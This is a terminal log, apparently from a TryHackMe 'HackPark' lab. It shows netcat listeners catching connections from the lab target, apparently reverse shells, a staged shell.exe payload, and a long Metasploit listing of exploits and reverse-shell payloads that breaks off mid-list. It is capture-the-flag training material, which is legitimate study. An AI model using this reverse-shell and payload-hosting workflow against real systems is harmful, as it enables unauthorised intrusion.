@@ -1,0 +1,2568 @@
+user@kali:~/tryhackme/hackpark$ ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:28:7f:8d brd ff:ff:ff:ff:ff:ff
+    inet 192.168.0.205/24 brd 192.168.0.255 scope global dynamic noprefixroute eth0
+       valid_lft 2083sec preferred_lft 2083sec
+    inet6 2a02:1810:952c:9800:1fe:7c45:1097:833c/64 scope global temporary dynamic
+       valid_lft 233521sec preferred_lft 60721sec
+    inet6 2a02:1810:952c:9800:a00:27ff:fe28:7f8d/64 scope global dynamic mngtmpaddr noprefixroute
+       valid_lft 233521sec preferred_lft 60721sec
+    inet6 fe80::a00:27ff:fe28:7f8d/64 scope link noprefixroute
+       valid_lft forever preferred_lft forever
+3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
+    link/none
+    inet 10.11.8.65/16 brd 10.11.255.255 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::412b:f750:c5b1:1c92/64 scope link stable-privacy
+       valid_lft forever preferred_lft forever
+user@kali:~/tryhackme/hackpark$ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.11.8.65] from (UNKNOWN) [10.10.191.128] 49498
+
+user@kali:~/tryhackme/hackpark$ nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.11.8.65] from (UNKNOWN) [10.10.191.128] 49499
+
+user@kali:~/tryhackme/hackpark$ ss -lnt
+State            Recv-Q            Send-Q                            Local Address:Port                        Peer Address:Port           Process
+LISTEN           0                 5                                       0.0.0.0:8888                             0.0.0.0:*
+LISTEN           0                 50                           [::ffff:127.0.0.1]:40565                                  *:*
+LISTEN           0                 50                           [::ffff:127.0.0.1]:8080                                   *:*
+user@kali:~/tryhackme/hackpark$ ls www/
+shell.exe
+user@kali:~/tryhackme/hackpark$ ls -l www
+total 76
+-rw-r--r-- 1 user user 73802 Aug  7 06:31 shell.exe
+user@kali:~/tryhackme/hackpark$ sudo msfdb run
+[sudo] password for user:
+Sorry, try again.
+[sudo] password for user:
+[+] Starting database
+
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+
+
+       =[ metasploit v5.0.98-dev                          ]
++ -- --=[ 2043 exploits - 1106 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again
+
+msf5 > search reverse
+
+Matching Modules
+================
+
+   #    Name                                                           Disclosure Date  Rank       Check  Description
+   -    ----                                                           ---------------  ----       -----  -----------
+   0    auxiliary/admin/http/netgear_r6700_pass_reset                  2020-06-15       normal     Yes    Netgear R6700v3 Unauthenticated LAN Admin Password
+Reset
+   1    auxiliary/admin/http/webnms_cred_disclosure                    2016-07-04       normal     No     WebNMS Framework Server Credential Disclosure
+   2    auxiliary/admin/mssql/mssql_ntlm_stealer                                        normal     No     Microsoft SQL Server NTLM Stealer
+   3    auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                   normal     No     Microsoft SQL Server SQLi NTLM Stealer
+   4    auxiliary/admin/scada/multi_cip_command                        2012-01-19       normal     No     Allen-Bradley/Rockwell Automation EtherNet/IP CIP C
+ommands
+   5    auxiliary/gather/enum_dns                                                       normal     No     DNS Record Scanner and Enumerator
+   6    auxiliary/scanner/http/dlink_user_agent_backdoor               2013-10-12       normal     No     D-Link User-Agent Backdoor Scanner
+   7    auxiliary/scanner/http/rewrite_proxy_bypass                                     normal     No     Apache Reverse Proxy Bypass Vulnerability Scanner
+   8    exploit/bsd/finger/morris_fingerd_bof                          1988-11-02       normal     Yes    Morris Worm fingerd Stack Buffer Overflow
+   9    exploit/linux/http/alcatel_omnipcx_mastercgi_exec              2007-09-09       manual     No     Alcatel-Lucent OmniPCX Enterprise masterCGI Arbitra
+ry Command Execution
+   10   exploit/linux/http/centreon_pollers_auth_rce                   2020-01-27       excellent  No     Centreon Poller Authenticated Remote Command Execut
+ion
+   11   exploit/linux/http/dlink_hnap_login_bof                        2016-11-07       excellent  Yes    Dlink DIR Routers Unauthenticated HNAP Login Stack
+Buffer Overflow
+   12   exploit/linux/http/goahead_ldpreload                           2017-12-18       excellent  Yes    GoAhead Web Server LD_PRELOAD Arbitrary Module Load
+   13   exploit/linux/http/ibm_qradar_unauth_rce                       2018-05-28       excellent  Yes    IBM QRadar SIEM Unauthenticated Remote Code Executi
+on
+   14   exploit/linux/http/nagios_xi_magpie_debug                      2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Executi
+on
+   15   exploit/linux/http/panos_readsessionvars                       2017-12-11       excellent  No     Palo Alto Networks readSessionVarsFromFile() Sessio
+n Corruption
+   16   exploit/multi/fileformat/evince_cbt_cmd_injection              2017-07-13       excellent  No     Evince CBT File Command Injection
+   17   exploit/multi/http/metasploit_webui_console_command_execution  2016-08-23       excellent  No     Metasploit Web UI Diagnostic Console Command Execut
+ion
+   18   exploit/multi/http/openx_backdoor_php                          2013-08-07       excellent  Yes    OpenX Backdoor PHP Code Execution
+   19   exploit/multi/misc/claymore_dual_miner_remote_manager_rce      2018-02-09       excellent  Yes    Nanopool Claymore Dual Miner APIs RCE
+   20   exploit/multi/postgres/postgres_copy_from_program_cmd_exec     2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   21   exploit/multi/vpn/tincd_bof                                    2013-04-22       average    No     Tincd Post-Authentication Remote TCP Stack Buffer O
+verflow
+   22   exploit/unix/http/epmp1000_get_chart_cmd_shell                 2017-12-18       excellent  Yes    Cambium ePMP1000 'get_chart' Shell via Command Inje
+ction (v3.1-3.5-RC7)
+   23   exploit/unix/http/epmp1000_ping_cmd_shell                      2015-11-28       excellent  Yes    Cambium ePMP1000 'ping' Shell via Command Injection
+ (up to v2.5)
+   24   exploit/unix/http/vmturbo_vmtadmin_exec_noauth                 2014-06-25       excellent  Yes    VMTurbo Operations Manager vmtadmin.cgi Remote Comm
+and Execution
+   25   exploit/unix/local/setuid_nmap                                 2012-07-19       excellent  Yes    Setuid Nmap Exploit
+   26   exploit/unix/smtp/morris_sendmail_debug                        1988-11-02       average    Yes    Morris Worm sendmail Debug Mode Shell Escape
+   27   exploit/unix/webapp/dogfood_spell_exec                         2009-03-03       excellent  Yes    Dogfood CRM spell.php Remote Command Execution
+   28   exploit/windows/browser/apple_quicktime_marshaled_punk         2010-08-30       great      No     Apple QuickTime 7.6.7 _Marshaled_pUnk Code Executio
+n
+   29   exploit/windows/browser/java_ws_arginject_altjvm               2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Inj
+ection
+   30   exploit/windows/browser/yahoomessenger_server                  2007-06-05       good       No     Yahoo! Messenger 8.1.0.249 ActiveX Control Buffer O
+verflow
+   31   exploit/windows/fileformat/vlc_mkv                             2018-05-24       great      No     VLC Media Player MKV Use After Free
+   32   exploit/windows/fileformat/vlc_smb_uri                         2009-06-24       great      No     VideoLAN Client (VLC) Win32 smb:// URI Buffer Overf
+low
+   33   exploit/windows/http/cayin_xpost_sql_rce                       2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
+   34   exploit/windows/http/hp_nnm_ovalarm_lang                       2009-12-09       great      No     HP OpenView Network Node Manager ovalarm.exe CGI Bu
+ffer Overflow
+   35   exploit/windows/imap/mercur_login                              2006-03-17       average    No     Mercur Messaging 2005 IMAP Login Buffer Overflow
+   36   exploit/windows/imap/novell_netmail_auth                       2007-01-07       average    No     Novell NetMail IMAP AUTHENTICATE Buffer Overflow
+   37   exploit/windows/local/payload_inject                           2011-10-12       excellent  No     Windows Manage Memory Payload Injection
+   38   exploit/windows/local/wmi                                      1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Com
+mand Execution
+   39   exploit/windows/misc/ais_esel_server_rce                       2019-03-27       excellent  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
+   40   exploit/windows/misc/crosschex_device_bof                      2019-11-28       normal     No     Anviz CrossChex Buffer Overflow
+   41   exploit/windows/mssql/mssql_linkcrawler                        2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command
+ Execution
+   42   exploit/windows/mssql/mssql_payload_sqli                       2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Inje
+ction
+   43   exploit/windows/scada/moxa_mdmtool                             2010-10-20       great      No     MOXA Device Manager Tool 2.1 Buffer Overflow
+   44   exploit/windows/smb/ms04_007_killbill                          2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Ove
+rflow
+   45   exploit/windows/smb/netidentity_xtierrpcpipe                   2009-04-06       great      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Bu
+ffer Overflow
+   46   exploit/windows/vpn/safenet_ike_11                             2009-06-01       average    No     SafeNet SoftRemote IKE Service Buffer Overflow
+   47   payload/aix/ppc/shell_reverse_tcp                                               normal     No     AIX Command Shell, Reverse TCP Inline
+   48   payload/android/meterpreter/reverse_http                                        normal     No     Android Meterpreter, Android Reverse HTTP Stager
+   49   payload/android/meterpreter/reverse_https                                       normal     No     Android Meterpreter, Android Reverse HTTPS Stager
+   50   payload/android/meterpreter/reverse_tcp                                         normal     No     Android Meterpreter, Android Reverse TCP Stager
+   51   payload/android/meterpreter_reverse_http                                        normal     No     Android Meterpreter Shell, Reverse HTTP Inline
+   52   payload/android/meterpreter_reverse_https                                       normal     No     Android Meterpreter Shell, Reverse HTTPS Inline
+   53   payload/android/meterpreter_reverse_tcp                                         normal     No     Android Meterpreter Shell, Reverse TCP Inline
+   54   payload/android/shell/reverse_http                                              normal     No     Command Shell, Android Reverse HTTP Stager
+   55   payload/android/shell/reverse_https                                             normal     No     Command Shell, Android Reverse HTTPS Stager
+   56   payload/android/shell/reverse_tcp                                               normal     No     Command Shell, Android Reverse TCP Stager
+   57   payload/apple_ios/aarch64/meterpreter_reverse_http                              normal     No     Apple_iOS Meterpreter, Reverse HTTP Inline
+   58   payload/apple_ios/aarch64/meterpreter_reverse_https                             normal     No     Apple_iOS Meterpreter, Reverse HTTPS Inline
+   59   payload/apple_ios/aarch64/meterpreter_reverse_tcp                               normal     No     Apple_iOS Meterpreter, Reverse TCP Inline
+   60   payload/apple_ios/aarch64/shell_reverse_tcp                                     normal     No     Apple iOS aarch64 Command Shell, Reverse TCP Inline
+   61   payload/apple_ios/armle/meterpreter_reverse_http                                normal     No     Apple_iOS Meterpreter, Reverse HTTP Inline
+   62   payload/apple_ios/armle/meterpreter_reverse_https                               normal     No     Apple_iOS Meterpreter, Reverse HTTPS Inline
+   63   payload/apple_ios/armle/meterpreter_reverse_tcp                                 normal     No     Apple_iOS Meterpreter, Reverse TCP Inline
+   64   payload/bsd/sparc/shell_reverse_tcp                                             normal     No     BSD Command Shell, Reverse TCP Inline
+   65   payload/bsd/vax/shell_reverse_tcp                                               normal     No     BSD Command Shell, Reverse TCP Inline
+   66   payload/bsd/x64/shell_reverse_ipv6_tcp                                          normal     No     BSD x64 Command Shell, Reverse TCP Inline (IPv6)
+   67   payload/bsd/x64/shell_reverse_tcp                                               normal     No     BSD x64 Shell Reverse TCP
+   68   payload/bsd/x64/shell_reverse_tcp_small                                         normal     No     BSD x64 Command Shell, Reverse TCP Inline
+   69   payload/bsd/x86/metsvc_reverse_tcp                                              normal     No     FreeBSD Meterpreter Service, Reverse TCP Inline
+   70   payload/bsd/x86/shell/reverse_ipv6_tcp                                          normal     No     BSD Command Shell, Reverse TCP Stager (IPv6)
+   71   payload/bsd/x86/shell/reverse_tcp                                               normal     No     BSD Command Shell, Reverse TCP Stager
+   72   payload/bsd/x86/shell_reverse_tcp                                               normal     No     BSD Command Shell, Reverse TCP Inline
+   73   payload/bsd/x86/shell_reverse_tcp_ipv6                                          normal     No     BSD Command Shell, Reverse TCP Inline (IPv6)
+   74   payload/bsdi/x86/shell/reverse_tcp                                              normal     No     BSDi Command Shell, Reverse TCP Stager
+   75   payload/bsdi/x86/shell_reverse_tcp                                              normal     No     BSDi Command Shell, Reverse TCP Inline
+   76   payload/cmd/mainframe/reverse_shell_jcl                                         normal     No     Z/OS (MVS) Command Shell, Reverse TCP
+   77   payload/cmd/unix/pingback_reverse                                               normal     No     Unix Command Shell, Pingback Reverse TCP (via netca
+t)
+   78   payload/cmd/unix/reverse                                                        normal     No     Unix Command Shell, Double Reverse TCP (telnet)
+   79   payload/cmd/unix/reverse_awk                                                    normal     No     Unix Command Shell, Reverse TCP (via AWK)
+   80   payload/cmd/unix/reverse_bash                                                   normal     No     Unix Command Shell, Reverse TCP (/dev/tcp)
+   81   payload/cmd/unix/reverse_bash_telnet_ssl                                        normal     No     Unix Command Shell, Reverse TCP SSL (telnet)
+   82   payload/cmd/unix/reverse_bash_udp                                               normal     No     Unix Command Shell, Reverse UDP (/dev/udp)
+   83   payload/cmd/unix/reverse_jjs                                                    normal     No     Unix Command Shell, Reverse TCP (via jjs)
+   84   payload/cmd/unix/reverse_ksh                                                    normal     No     Unix Command Shell, Reverse TCP (via Ksh)
+   85   payload/cmd/unix/reverse_lua                                                    normal     No     Unix Command Shell, Reverse TCP (via Lua)
+   86   payload/cmd/unix/reverse_ncat_ssl                                               normal     No     Unix Command Shell, Reverse TCP (via ncat)
+   87   payload/cmd/unix/reverse_netcat                                                 normal     No     Unix Command Shell, Reverse TCP (via netcat)
+   88   payload/cmd/unix/reverse_netcat_gaping                                          normal     No     Unix Command Shell, Reverse TCP (via netcat -e)
+   89   payload/cmd/unix/reverse_nodejs                                                 normal     No     Unix Command Shell, Reverse TCP (via nodejs)
+   90   payload/cmd/unix/reverse_openssl                                                normal     No     Unix Command Shell, Double Reverse TCP SSL (openssl
+)
+   91   payload/cmd/unix/reverse_perl                                                   normal     No     Unix Command Shell, Reverse TCP (via Perl)
+   92   payload/cmd/unix/reverse_perl_ssl                                               normal     No     Unix Command Shell, Reverse TCP SSL (via perl)
+   93   payload/cmd/unix/reverse_php_ssl                                                normal     No     Unix Command Shell, Reverse TCP SSL (via php)
+   94   payload/cmd/unix/reverse_python                                                 normal     No     Unix Command Shell, Reverse TCP (via Python)
+   95   payload/cmd/unix/reverse_python_ssl                                             normal     No     Unix Command Shell, Reverse TCP SSL (via python)
+   96   payload/cmd/unix/reverse_r                                                      normal     No     Unix Command Shell, Reverse TCP (via R)
+   97   payload/cmd/unix/reverse_ruby                                                   normal     No     Unix Command Shell, Reverse TCP (via Ruby)
+   98   payload/cmd/unix/reverse_ruby_ssl                                               normal     No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   99   payload/cmd/unix/reverse_socat_udp                                              normal     No     Unix Command Shell, Reverse UDP (via socat)
+   100  payload/cmd/unix/reverse_ssh                                                    normal     No     Unix Command Shell, Reverse TCP SSH
+   101  payload/cmd/unix/reverse_ssl_double_telnet                                      normal     No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+   102  payload/cmd/unix/reverse_stub                                                   normal     No     Unix Command Shell, Reverse TCP (stub)
+   103  payload/cmd/unix/reverse_tclsh                                                  normal     No     Unix Command Shell, Reverse TCP (via Tclsh)
+   104  payload/cmd/unix/reverse_zsh                                                    normal     No     Unix Command Shell, Reverse TCP (via Zsh)
+   105  payload/cmd/windows/powershell_reverse_tcp                                      normal     No     Windows Interactive Powershell Session, Reverse TCP
+   106  payload/cmd/windows/reverse_lua                                                 normal     No     Windows Command Shell, Reverse TCP (via Lua)
+   107  payload/cmd/windows/reverse_perl                                                normal     No     Windows Command, Double Reverse TCP Connection (via
+ Perl)
+   108  payload/cmd/windows/reverse_powershell                                          normal     No     Windows Command Shell, Reverse TCP (via Powershell)
+   109  payload/cmd/windows/reverse_ruby                                                normal     No     Windows Command Shell, Reverse TCP (via Ruby)
+   110  payload/firefox/shell_reverse_tcp                                               normal     No     Command Shell, Reverse TCP (via Firefox XPCOM scrip
+t)
+   111  payload/generic/shell_reverse_tcp                                               normal     No     Generic Command Shell, Reverse TCP Inline
+   112  payload/java/jsp_shell_reverse_tcp                                              normal     No     Java JSP Command Shell, Reverse TCP Inline
+   113  payload/java/meterpreter/reverse_http                                           normal     No     Java Meterpreter, Java Reverse HTTP Stager
+   114  payload/java/meterpreter/reverse_https                                          normal     No     Java Meterpreter, Java Reverse HTTPS Stager
+   115  payload/java/meterpreter/reverse_tcp                                            normal     No     Java Meterpreter, Java Reverse TCP Stager
+   116  payload/java/shell/reverse_tcp                                                  normal     No     Command Shell, Java Reverse TCP Stager
+   117  payload/java/shell_reverse_tcp                                                  normal     No     Java Command Shell, Reverse TCP Inline
+   118  payload/linux/aarch64/meterpreter/reverse_tcp                                   normal     No     Linux Meterpreter, Reverse TCP Stager
+   119  payload/linux/aarch64/meterpreter_reverse_http                                  normal     No     Linux Meterpreter, Reverse HTTP Inline
+   120  payload/linux/aarch64/meterpreter_reverse_https                                 normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   121  payload/linux/aarch64/meterpreter_reverse_tcp                                   normal     No     Linux Meterpreter, Reverse TCP Inline
+   122  payload/linux/aarch64/shell/reverse_tcp                                         normal     No     Linux dup2 Command Shell, Reverse TCP Stager
+   123  payload/linux/aarch64/shell_reverse_tcp                                         normal     No     Linux Command Shell, Reverse TCP Inline
+   124  payload/linux/armbe/meterpreter_reverse_http                                    normal     No     Linux Meterpreter, Reverse HTTP Inline
+   125  payload/linux/armbe/meterpreter_reverse_https                                   normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   126  payload/linux/armbe/meterpreter_reverse_tcp                                     normal     No     Linux Meterpreter, Reverse TCP Inline
+   127  payload/linux/armle/meterpreter/reverse_tcp                                     normal     No     Linux Meterpreter, Reverse TCP Stager
+   128  payload/linux/armle/meterpreter_reverse_http                                    normal     No     Linux Meterpreter, Reverse HTTP Inline
+   129  payload/linux/armle/meterpreter_reverse_https                                   normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   130  payload/linux/armle/meterpreter_reverse_tcp                                     normal     No     Linux Meterpreter, Reverse TCP Inline
+   131  payload/linux/armle/shell/reverse_tcp                                           normal     No     Linux dup2 Command Shell, Reverse TCP Stager
+   132  payload/linux/armle/shell_bind_tcp                                              normal     No     Linux Command Shell, Reverse TCP Inline
+   133  payload/linux/armle/shell_reverse_tcp                                           normal     No     Linux Command Shell, Reverse TCP Inline
+   134  payload/linux/mips64/meterpreter_reverse_http                                   normal     No     Linux Meterpreter, Reverse HTTP Inline
+   135  payload/linux/mips64/meterpreter_reverse_https                                  normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   136  payload/linux/mips64/meterpreter_reverse_tcp                                    normal     No     Linux Meterpreter, Reverse TCP Inline
+   137  payload/linux/mipsbe/meterpreter/reverse_tcp                                    normal     No     Linux Meterpreter, Reverse TCP Stager
+   138  payload/linux/mipsbe/meterpreter_reverse_http                                   normal     No     Linux Meterpreter, Reverse HTTP Inline
+   139  payload/linux/mipsbe/meterpreter_reverse_https                                  normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   140  payload/linux/mipsbe/meterpreter_reverse_tcp                                    normal     No     Linux Meterpreter, Reverse TCP Inline
+   141  payload/linux/mipsbe/shell/reverse_tcp                                          normal     No     Linux Command Shell, Reverse TCP Stager
+   142  payload/linux/mipsbe/shell_reverse_tcp                                          normal     No     Linux Command Shell, Reverse TCP Inline
+   143  payload/linux/mipsle/meterpreter/reverse_tcp                                    normal     No     Linux Meterpreter, Reverse TCP Stager
+   144  payload/linux/mipsle/meterpreter_reverse_http                                   normal     No     Linux Meterpreter, Reverse HTTP Inline
+   145  payload/linux/mipsle/meterpreter_reverse_https                                  normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   146  payload/linux/mipsle/meterpreter_reverse_tcp                                    normal     No     Linux Meterpreter, Reverse TCP Inline
+   147  payload/linux/mipsle/shell/reverse_tcp                                          normal     No     Linux Command Shell, Reverse TCP Stager
+   148  payload/linux/mipsle/shell_reverse_tcp                                          normal     No     Linux Command Shell, Reverse TCP Inline
+   149  payload/linux/ppc/meterpreter_reverse_http                                      normal     No     Linux Meterpreter, Reverse HTTP Inline
+   150  payload/linux/ppc/meterpreter_reverse_https                                     normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   151  payload/linux/ppc/meterpreter_reverse_tcp                                       normal     No     Linux Meterpreter, Reverse TCP Inline
+   152  payload/linux/ppc/shell_reverse_tcp                                             normal     No     Linux Command Shell, Reverse TCP Inline
+   153  payload/linux/ppc64/shell_reverse_tcp                                           normal     No     Linux Command Shell, Reverse TCP Inline
+   154  payload/linux/ppc64le/meterpreter_reverse_http                                  normal     No     Linux Meterpreter, Reverse HTTP Inline
+   155  payload/linux/ppc64le/meterpreter_reverse_https                                 normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   156  payload/linux/ppc64le/meterpreter_reverse_tcp                                   normal     No     Linux Meterpreter, Reverse TCP Inline
+   157  payload/linux/ppce500v2/meterpreter_reverse_http                                normal     No     Linux Meterpreter, Reverse HTTP Inline
+   158  payload/linux/ppce500v2/meterpreter_reverse_https                               normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   159  payload/linux/ppce500v2/meterpreter_reverse_tcp                                 normal     No     Linux Meterpreter, Reverse TCP Inline
+   160  payload/linux/x64/meterpreter/reverse_tcp                                       normal     No     Linux Mettle x64, Reverse TCP Stager
+   161  payload/linux/x64/meterpreter_reverse_http                                      normal     No     Linux Meterpreter, Reverse HTTP Inline
+   162  payload/linux/x64/meterpreter_reverse_https                                     normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   163  payload/linux/x64/meterpreter_reverse_tcp                                       normal     No     Linux Meterpreter, Reverse TCP Inline
+   164  payload/linux/x64/pingback_reverse_tcp                                          normal     No     Linux x64 Pingback, Reverse TCP Inline
+   165  payload/linux/x64/shell/reverse_tcp                                             normal     No     Linux Command Shell, Reverse TCP Stager
+   166  payload/linux/x64/shell_reverse_ipv6_tcp                                        normal     No     Linux x64 Command Shell, Reverse TCP Inline (IPv6)
+   167  payload/linux/x64/shell_reverse_tcp                                             normal     No     Linux Command Shell, Reverse TCP Inline
+   168  payload/linux/x86/meterpreter/reverse_ipv6_tcp                                  normal     No     Linux Mettle x86, Reverse TCP Stager (IPv6)
+   169  payload/linux/x86/meterpreter/reverse_nonx_tcp                                  normal     No     Linux Mettle x86, Reverse TCP Stager
+   170  payload/linux/x86/meterpreter/reverse_tcp                                       normal     No     Linux Mettle x86, Reverse TCP Stager
+   171  payload/linux/x86/meterpreter/reverse_tcp_uuid                                  normal     No     Linux Mettle x86, Reverse TCP Stager
+   172  payload/linux/x86/meterpreter_reverse_http                                      normal     No     Linux Meterpreter, Reverse HTTP Inline
+   173  payload/linux/x86/meterpreter_reverse_https                                     normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   174  payload/linux/x86/meterpreter_reverse_tcp                                       normal     No     Linux Meterpreter, Reverse TCP Inline
+   175  payload/linux/x86/metsvc_reverse_tcp                                            normal     No     Linux Meterpreter Service, Reverse TCP Inline
+   176  payload/linux/x86/shell/reverse_ipv6_tcp                                        normal     No     Linux Command Shell, Reverse TCP Stager (IPv6)
+   177  payload/linux/x86/shell/reverse_nonx_tcp                                        normal     No     Linux Command Shell, Reverse TCP Stager
+   178  payload/linux/x86/shell/reverse_tcp                                             normal     No     Linux Command Shell, Reverse TCP Stager
+   179  payload/linux/x86/shell/reverse_tcp_uuid                                        normal     No     Linux Command Shell, Reverse TCP Stager
+   180  payload/linux/x86/shell_reverse_tcp                                             normal     No     Linux Command Shell, Reverse TCP Inline
+   181  payload/linux/x86/shell_reverse_tcp_ipv6                                        normal     No     Linux Command Shell, Reverse TCP Inline (IPv6)
+   182  payload/linux/zarch/meterpreter_reverse_http                                    normal     No     Linux Meterpreter, Reverse HTTP Inline
+   183  payload/linux/zarch/meterpreter_reverse_https                                   normal     No     Linux Meterpreter, Reverse HTTPS Inline
+   184  payload/linux/zarch/meterpreter_reverse_tcp                                     normal     No     Linux Meterpreter, Reverse TCP Inline
+   185  payload/mainframe/shell_reverse_tcp                                             normal     No     Z/OS (MVS) Command Shell, Reverse TCP Inline
+   186  payload/multi/meterpreter/reverse_http                                          normal     No     Architecture-Independent Meterpreter Stage, Reverse
+ HTTP Stager (Mulitple Architectures)
+   187  payload/multi/meterpreter/reverse_https                                         normal     No     Architecture-Independent Meterpreter Stage, Reverse
+ HTTPS Stager (Mulitple Architectures)
+   188  payload/netware/shell/reverse_tcp                                               normal     No     NetWare Command Shell, Reverse TCP Stager
+   189  payload/nodejs/shell_reverse_tcp                                                normal     No     Command Shell, Reverse TCP (via nodejs)
+   190  payload/nodejs/shell_reverse_tcp_ssl                                            normal     No     Command Shell, Reverse TCP SSL (via nodejs)
+   191  payload/osx/armle/execute/reverse_tcp                                           normal     No     OS X Write and Execute Binary, Reverse TCP Stager
+   192  payload/osx/armle/shell/reverse_tcp                                             normal     No     OS X Command Shell, Reverse TCP Stager
+   193  payload/osx/armle/shell_reverse_tcp                                             normal     No     Apple iOS Command Shell, Reverse TCP Inline
+   194  payload/osx/ppc/shell/reverse_tcp                                               normal     No     OS X Command Shell, Reverse TCP Stager
+   195  payload/osx/ppc/shell_reverse_tcp                                               normal     No     OS X Command Shell, Reverse TCP Inline
+   196  payload/osx/x64/dupandexecve/reverse_tcp                                        normal     No     OS X dup2 Command Shell, Reverse TCP Stager
+   197  payload/osx/x64/dupandexecve/reverse_tcp_uuid                                   normal     No     OS X dup2 Command Shell, Reverse TCP Stager with UU
+ID Support (OSX x64)
+   198  payload/osx/x64/meterpreter/reverse_tcp                                         normal     No     OSX Meterpreter, Reverse TCP Stager
+   199  payload/osx/x64/meterpreter/reverse_tcp_uuid                                    normal     No     OSX Meterpreter, Reverse TCP Stager with UUID Suppo
+rt (OSX x64)
+   200  payload/osx/x64/meterpreter_reverse_http                                        normal     No     OSX Meterpreter, Reverse HTTP Inline
+   201  payload/osx/x64/meterpreter_reverse_https                                       normal     No     OSX Meterpreter, Reverse HTTPS Inline
+   202  payload/osx/x64/meterpreter_reverse_tcp                                         normal     No     OSX Meterpreter, Reverse TCP Inline
+   203  payload/osx/x64/shell_reverse_tcp                                               normal     No     OS X x64 Shell Reverse TCP
+   204  payload/osx/x86/bundleinject/reverse_tcp                                        normal     No     Mac OS X Inject Mach-O Bundle, Reverse TCP Stager
+   205  payload/osx/x86/isight/reverse_tcp                                              normal     No     Mac OS X x86 iSight Photo Capture, Reverse TCP Stag
+er
+   206  payload/osx/x86/shell_reverse_tcp                                               normal     No     OS X Command Shell, Reverse TCP Inline
+   207  payload/osx/x86/vforkshell/reverse_tcp                                          normal     No     OS X (vfork) Command Shell, Reverse TCP Stager
+   208  payload/osx/x86/vforkshell_reverse_tcp                                          normal     No     OS X (vfork) Command Shell, Reverse TCP Inline
+   209  payload/php/meterpreter/reverse_tcp                                             normal     No     PHP Meterpreter, PHP Reverse TCP Stager
+   210  payload/php/meterpreter/reverse_tcp_uuid                                        normal     No     PHP Meterpreter, PHP Reverse TCP Stager
+   211  payload/php/meterpreter_reverse_tcp                                             normal     No     PHP Meterpreter, Reverse TCP Inline
+   212  payload/php/reverse_perl                                                        normal     No     PHP Command, Double Reverse TCP Connection (via Per
+l)
+   213  payload/php/reverse_php                                                         normal     No     PHP Command Shell, Reverse TCP (via PHP)
+   214  payload/php/shell_findsock                                                      normal     No     PHP Command Shell, Find Sock
+   215  payload/python/meterpreter/reverse_http                                         normal     No     Python Meterpreter, Python Reverse HTTP Stager
+   216  payload/python/meterpreter/reverse_https                                        normal     No     Python Meterpreter, Python Reverse HTTPS Stager
+   217  payload/python/meterpreter/reverse_tcp                                          normal     No     Python Meterpreter, Python Reverse TCP Stager
+   218  payload/python/meterpreter/reverse_tcp_ssl                                      normal     No     Python Meterpreter, Python Reverse TCP SSL Stager
+   219  payload/python/meterpreter/reverse_tcp_uuid                                     normal     No     Python Meterpreter, Python Reverse TCP Stager with
+UUID Support
+   220  payload/python/meterpreter_reverse_http                                         normal     No     Python Meterpreter Shell, Reverse HTTP Inline
